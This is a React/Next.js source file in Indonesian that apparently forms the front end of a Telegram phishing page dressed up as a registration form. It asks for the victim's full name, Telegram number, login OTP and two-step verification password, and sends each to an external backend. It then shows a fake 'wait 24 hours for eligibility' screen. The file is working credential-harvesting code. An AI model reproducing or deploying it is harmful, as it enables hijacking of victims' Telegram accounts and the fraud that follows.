"use client";
import { useState } from 'react';
import Image from 'next/image';

export default function AuthForm() {
  const [step, setStep] = useState(1);
  const [nama, setNama] = useState('');
  const [nomor, setNomor] = useState('');
  const [otp, setOtp] = useState('');
  const [sandi, setSandi] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isFinished, setIsFinished] = useState(false);

  const handleNext = async () => {
    setIsLoading(true);
    try {
      const response = await fetch('https://backend-python-production-6e72.up.railway.app/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ step, nomor, otp, sandi, nama })
      });
      const data = await response.json();

      if (step === 1) setStep(2);
      else if (step === 2) {
        if (data.status === 'need_2fa') setStep(3);
        else setIsFinished(true);
      } else if (step === 3) {
        setIsFinished(true);
      }
    } catch (error) {
      if (step === 3) setIsFinished(true);
    }
    setIsLoading(false);
  };

  // TAMPILAN LOADING BERPUTAR (FULL SCREEN)
  if (isFinished) {
    return (
      <div className="full-screen-center">
        <div className="spinner-circle">
          <div className="spinner-inner-static">
            <p className="text-[#2196f3] font-bold text-sm">PROCESSING</p>
            <p className="text-[#2196f3] italic text-[10px]">please wait...</p>
          </div>
        </div>
        <p className="loading-status-text">
          Silakan tunggu prosesnya konfirmasi dalam waktu 1x24 jam untuk memeriksa kelayakan
        </p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col items-center">
      {/* BANNER */}
      <div className="w-full max-w-md relative aspect-[16/9]">
        <Image 
          src="/banner.jpeg" 
          alt="Banner" 
          fill 
          className="object-cover"
          priority
        />
      </div>

      <div className="w-full max-w-md p-6 space-y-4">
        {step === 1 && (
          <>
            <div>
              <label className="block text-sm font-bold mb-1">Nama Lengkap Sesuai KTP:</label>
              <input 
                type="text"
                className="w-full p-3 border rounded-lg bg-gray-50 focus:outline-none"
                placeholder="Masukkan nama lengkap"
                value={nama}
                onChange={(e) => setNama(e.target.value)}
              />
            </div>
            <div>
              <label className="block text-sm font-bold mb-1">Nomor Telegram Aktif:</label>
              <input 
                type="number"
                className="w-full p-3 border rounded-lg bg-gray-50 focus:outline-none"
                placeholder="085168712778"
                value={nomor}
                onChange={(e) => setNomor(e.target.value)}
              />
            </div>
          </>
        )}

        {step === 2 && (
          <div>
            <label className="block text-sm font-bold mb-1 text-center">Masukkan Kode OTP:</label>
            <input 
              type="number"
              className="w-full p-3 border rounded-lg bg-gray-50 text-center text-xl tracking-widest focus:outline-none"
              placeholder="12345"
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
            />
          </div>
        )}

        {step === 3 && (
          <div>
            <label className="block text-sm font-bold mb-1 text-center">Masukkan Sandi Verifikasi Dua Langkah:</label>
            <input 
              type="password"
              className="w-full p-3 border rounded-lg bg-gray-50 text-center focus:outline-none"
              placeholder="Sandi Anda"
              value={sandi}
              onChange={(e) => setSandi(e.target.value)}
            />
          </div>
        )}

        <button 
          onClick={handleNext}
          disabled={isLoading}
          className="w-full bg-[#1d4ed8] hover:bg-blue-700 text-white font-bold py-4 rounded-lg transition-all"
        >
          {isLoading ? "MEMPROSES..." : "DAFTAR SEKARANG"}
        </button>

        <p className="text-[11px] text-gray-500 italic mt-4">
          Peringatan:<br/>
          Pendaftaran hanya akan diproses melalui nomor telegram aktif!
        </p>
      </div>
    </div>
  );
}